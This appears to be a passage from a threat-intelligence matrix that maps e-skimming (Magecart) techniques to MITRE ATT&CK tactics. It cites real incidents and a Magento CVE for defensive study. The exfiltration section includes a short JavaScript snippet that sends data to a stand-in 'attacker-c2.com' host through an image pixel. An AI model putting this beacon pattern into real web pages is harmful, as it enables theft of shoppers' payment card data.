...
for e-skimming (web skimming, formjacking, Magecart) attacks. Based on extensive
research and analysis of real-world e-skimming campaigns, this matrix maps
attack techniques, tactics, and procedures (TTPs) used by threat actors to
compromise e-commerce platforms and steal payment card data.

**Document Version**: 1.0 **Last Updated**: 2025-01-18 **Target Environment**:
Web applications, e-commerce platforms, payment processing systems
...
The techniques used by attackers to gain initial entry into the target
e-commerce infrastructure.

#### T1190: Exploit Public-Facing Application

**Description**: Exploitation of vulnerabilities in e-commerce platforms to gain
access.

**E-Skimming Context**:

- **CVE-2024-34102 (CosmicSting)**: XXE vulnerability in Adobe Commerce/Magento
  2.4.7
  - CVSS Score: 9.8/10
...
**Description**: Use of stolen or compromised credentials to access e-commerce
admin panels.

**E-Skimming Context**:

- **Stolen Admin Credentials**: Phishing, info-stealer malware, credential
  stuffing
...
- **British Airways (2018)**: Stolen admin credentials used to modify Modernizr
  library
...
**Description**: Manipulation of third-party services, libraries, or
dependencies to inject malicious code.

**E-Skimming Context**:

- **Third-Party Script Compromise**: CDN providers, analytics services, chat
  widgets
- **Extension/Plugin Hijacking**: Compromised browser extensions and CMS plugins
- **Library Modifications**: Tampering with JavaScript libraries (jQuery,
  Modernizr, etc.)
...
- **Ticketmaster (2018)**: Compromised Inbenta chatbot third-party service
  (40,000 victims)
...
- **Client-Side Execution**: All e-skimming attacks execute JavaScript in the
  browser
...
**Description**: Exploitation of browser or extension vulnerabilities to execute
skimmer code.

**E-Skimming Context**:

- **Browser Extension Vulnerabilities**: Privilege escalation through extension
  permissions
...
**Description**: Use of malicious or compromised browser extensions for
persistent access.
...
- **Library Tampering**: Injecting code into common libraries (jQuery,
  Modernizr)
...
Techniques to transmit stolen payment data to attacker-controlled
infrastructure.
...
var img = new Image()
img.src =
  'https://attacker-c2.com/pixel.gif?data=' +
...
- **Characteristics**: Multi-form data, localStorage scraping, supply chain
  focus
...
4. **Defense Evasion** [T1027]: Minimal obfuscation, blended with legitimate
   code
...
1. **Initial Access** [T1195.002]: Compromised Inbenta chatbot third-party
   service
...
E-skimming attacks represent a sophisticated and evolving threat to e-commerce
platforms. This MITRE ATT&CK matrix provides a comprehensive framework for
understanding, detecting, and defending against these attacks.

**Key Takeaways**:

1. **Multi-Stage Attacks**: E-skimming involves multiple tactics from initial
   access through exfiltration
...
4. **Detection Challenges**: Obfuscation and evasion techniques make detection
   difficult
...
_For updates, contributions, or questions, please refer to the main repository._
